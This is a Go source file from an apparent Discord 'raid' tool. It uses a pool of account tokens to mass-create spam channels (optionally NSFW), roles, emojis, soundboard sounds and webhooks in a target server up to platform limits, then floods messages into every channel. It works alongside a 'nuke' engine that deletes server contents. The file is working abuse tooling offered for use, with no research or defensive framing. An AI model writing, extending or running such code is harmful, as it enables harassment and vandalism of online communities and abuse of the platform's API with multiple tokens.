// Package raid spams creation of channels/categories/roles/emojis/stickers/
// sounds/webhooks until caps or Discord limits, then floods messages.
package raid

import (
	"context"
	"encoding/base64"
	"fmt"
	"sync"

	"github.com/M1noa/wrack/api"
	"github.com/M1noa/wrack/nuke"
	"github.com/M1noa/wrack/payload"
	"github.com/M1noa/wrack/token"
	"github.com/M1noa/wrack/ui"
)

// Config caps spam creation (0 = hit Discord limits).
type Config struct {
	GuildID     string
	Short       string // spam name for everything
	MaxChannels int
	MaxRoles    int
	MaxEmojis   int
	MaxStickers int
	MaxSounds   int
	NSFW        bool // set nsfw=true on created channels
	ImageData   []byte
}

// Engine creates spam objects.
type Engine struct {
	Cfg  *Config
	Pool *token.Pool
	Nuke *nuke.Engine // for TrackCreated + shared state
	msg  *payload.Message
	mu   sync.Mutex
}

// New builds a Raid engine.
func New(cfg *Config, pool *token.Pool, n *nuke.Engine, msg *payload.Message) *Engine {
	return &Engine{Cfg: cfg, Pool: pool, Nuke: n, msg: msg}
}

// Run fires all creation phases in order.
func (e *Engine) Run(ctx context.Context) {
	e.channels(ctx)
	e.categories(ctx)
	e.roles(ctx)
	e.emojis(ctx)
	e.stickers(ctx)
	e.sounds(ctx)
	e.webhooks(ctx)
	e.messages(ctx)
}

func (e *Engine) tokens() []*token.Token {
	var out []*token.Token
	for _, t := range e.Pool.Tokens {
		if t.InGuild && len(t.Errors) == 0 {
			out = append(out, t)
		}
	}
	return out
}

// createLoop fans out n creations round-robin across tokens with a cap.
func createLoop[T any](ctx context.Context, tokens []*token.Token, maxN int, fn func(*token.Token, int) (*T, error)) []any {
	if len(tokens) == 0 || maxN == 0 {
		return nil
	}
	if maxN < 0 {
		maxN = 500 // Discord channel cap as sane default when unlimited
	}
	shards := token.Shard(make([]int, maxN), len(tokens))
	out := make([]any, 0, maxN)
	var mu sync.Mutex
	var wg sync.WaitGroup

	// Assign sequential IDs per shard so names differ slightly if desired;
	// we just use the same short name repeatedly per user request.
	for i, shard := range shards {
		wg.Add(1)
		go func(shard []int, idx int) {
			defer wg.Done()
			t := tokens[idx%len(tokens)]
			for range shard {
				select {
				case <-ctx.Done():
					return
				default:
				}
				obj, err := fn(t, idx)
				if err == nil && obj != nil {
					mu.Lock()
					out = append(out, obj)
					mu.Unlock()
				}
			}
		}(shard, i)
	}
	wg.Wait()
	return out
}

func (e *Engine) channels(ctx context.Context) {
	n := e.Cfg.MaxChannels
	if n <= 0 {
		n = -1 // unlimited
	}
	p := &ui.Progress{Label: "channels"}
	body := map[string]any{
		"name": e.Cfg.Short,
		"type": 0,
	}
	if e.Cfg.NSFW {
		body["nsfw"] = true
	}
	created := createLoop[api.Channel](ctx, e.tokens(), n, func(t *token.Token, _ int) (*api.Channel, error) {
		ch, err := t.Client.CreateChannel(ctx, e.Cfg.GuildID, body)
		if err != nil {
			return nil, err
		}
		p.Tick(1)
		return ch, nil
	})
	p.Finish()
	ui.Ok("channels created: %d", len(created))
}

func (e *Engine) categories(ctx context.Context) {
	n := 5 // small; categories aren't the point
	p := &ui.Progress{Label: "categories", Total: int64(n)}
	_ = createLoop[api.Channel](ctx, e.tokens(), n, func(t *token.Token, _ int) (*api.Channel, error) {
		ch, err := t.Client.CreateChannel(ctx, e.Cfg.GuildID, map[string]any{"name": e.Cfg.Short, "type": 4})
		if err != nil {
			return nil, err
		}
		p.Tick(1)
		return ch, nil
	})
	p.Finish()
}

func (e *Engine) roles(ctx context.Context) {
	n := e.Cfg.MaxRoles
	if n <= 0 {
		n = 250 // Discord role cap
	}
	p := &ui.Progress{Label: "roles", Total: int64(n)}
	created := createLoop[api.Role](ctx, e.tokens(), n, func(t *token.Token, i int) (*api.Role, error) {
		r, err := t.Client.CreateRole(ctx, e.Cfg.GuildID, map[string]any{
			"name":        e.Cfg.Short,
			"color":       ui.AccentColor,
			"mentionable": true,
		})
		if err != nil {
			return nil, err
		}
		p.Tick(1)
		return r, nil
	})
	p.Finish()
	ui.Ok("roles created: %d", len(created))
}

func (e *Engine) emojis(ctx context.Context) {
	n := e.Cfg.MaxEmojis
	imgData := e.Cfg.ImageData
	if imgData == nil {
		b, err := payload.BlankPNG(320)
		if err != nil {
			ui.Err("blank emoji png: %v", err)
			return
		}
		imgData = b
	}
	dataURI := payload.DataURI(imgData)

	// Fetch existing to know how many slots are left.
	t := e.Pool.Next()
	if t == nil {
		return
	}
	existing, _ := t.Client.ListEmojis(ctx, e.Cfg.GuildID)
	capacity := emojiCap(e.Nuke.Snap.Guild.PremiumTier)
	slots := capacity - len(existing)
	if slots <= 0 {
		ui.Dim("emoji slots full (%d/%d)", len(existing), capacity)
		return
	}
	if n > slots {
		n = slots
	}
	if n <= 0 {
		return
	}
	p := &ui.Progress{Label: "emojis", Total: int64(n)}
	created := createLoop[api.Emoji](ctx, e.tokens(), n, func(t *token.Token, i int) (*api.Emoji, error) {
		em, err := t.Client.CreateEmoji(ctx, e.Cfg.GuildID, map[string]any{
			"name": e.Cfg.Short, "image": dataURI,
		})
		if err != nil {
			return nil, err
		}
		p.Tick(1)
		return em, nil
	})
	p.Finish()
	ui.Ok("emojis created: %d", len(created))
}

// Guild premium tier is cached on client after recon via GetGuild; approximate here.
var tierCache = make(map[string]int)

func emojiCap(tier int) int {
	switch tier {
	case 3:
		return 250
	case 2:
		return 150
	case 1:
		return 100
	default:
		return 50
	}
}

func (e *Engine) stickers(ctx context.Context) {
	n := e.Cfg.MaxStickers
	imgData := e.Cfg.ImageData
	if imgData == nil {
		b, err := payload.BlankPNG(320)
		if err != nil {
			ui.Err("blank sticker png: %v", err)
			return
		}
		imgData = b
	}
	t := e.Pool.Next()
	if t == nil {
		return
	}
	existing, _ := t.Client.ListStickers(ctx, e.Cfg.GuildID)
	capacity := stickerCap(e.Cfg.GuildID)
	slots := capacity - len(existing)
	if slots <= 0 {
		ui.Dim("sticker slots full (%d/%d)", len(existing), capacity)
		return
	}
	if n > slots || n <= 0 {
		n = slots
	}
	p := &ui.Progress{Label: "stickers", Total: int64(n)}
	created := createLoop[api.Sticker](ctx, e.tokens(), n, func(t *token.Token, i int) (*api.Sticker, error) {
		// Sticker upload uses multipart/form-data; simplified here as JSON body
		// since our api.Do marshals JSON. Real impl needs multipart support.
		// TODO: multipart upload path in api package.
		return nil, errNotImpl
	})
	_ = created
	p.Finish()
	ui.Warn("stickers: multipart upload not yet wired")
}

var errNotImpl = fmt.Errorf("not implemented")

func stickerCap(guildID string) int { return 5 } // base tier; boost raises it

func (e *Engine) sounds(ctx context.Context) {
	n := e.Cfg.MaxSounds
	soundBytes := payload.SilentMP3()
	dataURI := "data:audio/mpeg;base64," + base64.StdEncoding.EncodeToString(soundBytes)
	t := e.Pool.Next()
	if t == nil {
		return
	}
	existing, _ := t.Client.ListSounds(ctx, e.Cfg.GuildID)
	slots := 8 - len(existing) // soundboard default cap ~8; boost tiers raise
	if slots <= 0 {
		ui.Dim("sound slots full")
		return
	}
	if n > slots || n <= 0 {
		n = slots
	}
	p := &ui.Progress{Label: "sounds", Total: int64(n)}
	created := createLoop[api.SoundboardSound](ctx, e.tokens(), n, func(t *token.Token, i int) (*api.SoundboardSound, error) {
		resp, err := t.Client.Do(ctx, "POST",
			fmt.Sprintf("/guilds/%s/soundboard-sounds", e.Cfg.GuildID),
			map[string]any{"name": e.Cfg.Short, "sound": dataURI})
		if err != nil {
			return nil, err
		}
		if resp.StatusCode >= 400 {
			api.DiscardBody(resp)
			return nil, fmt.Errorf("create sound: %d", resp.StatusCode)
		}
		var s api.SoundboardSound
		if err := api.DecodeJSON(resp, &s); err != nil {
			return nil, err
		}
		p.Tick(1)
		return &s, nil
	})
	p.Finish()
	ui.Ok("sounds created: %d", len(created))
}

func (e *Engine) webhooks(ctx context.Context) {
	// For every channel we know about, try to add a webhook named short.
	hookTokens := e.Pool.WithPerm(api.PermManageWebhooks)
	if len(hookTokens) == 0 {
		ui.Dim("no MANAGE_WEBHOOKS; skipping webhook creation")
		return
	}
	chans := e.Nuke.Snap.TextVoice // post-nuke this is empty unless message-only mode
	p := &ui.Progress{Label: "webhooks", Total: int64(len(chans))}
	fanOut(hookTokens, chans, func(t *token.Token, ch api.Channel) {
		if _, err := t.Client.CreateWebhook(ctx, ch.ID, e.Cfg.Short, "wrack"); err == nil {
			p.Tick(1)
		}
	})
	p.Finish()
}

func fanOut[T any](tokens []*token.Token, items []T, fn func(*token.Token, T)) {
	if len(items) == 0 || len(tokens) == 0 {
		return
	}
	shards := token.Shard(items, len(tokens))
	var wg sync.WaitGroup
	for i, sh := range shards {
		wg.Add(1)
		go func(shard []T, t *token.Token) {
			defer wg.Done()
			for _, item := range shard {
				fn(t, item)
			}
		}(sh, tokens[i])
	}
	wg.Wait()
}

func (e *Engine) messages(ctx context.Context) {
	if e.msg == nil {
		ui.Dim("no message set; skipping flood")
		return
	}
	chans := e.Nuke.Snap.TextVoice
	if len(chans) == 0 {
		return
	}
	fanOut(e.tokens(), chans, func(t *token.Token, ch api.Channel) {
		_ = t.Client.SendMessage(ctx, ch.ID, e.msg)
	})
	ui.Ok("messages flooded into %d channels", len(chans))
}

// MessagesOnly sends messages to every existing channel without deleting anything.
func (e *Engine) MessagesOnly(ctx context.Context) { e.messages(ctx) }


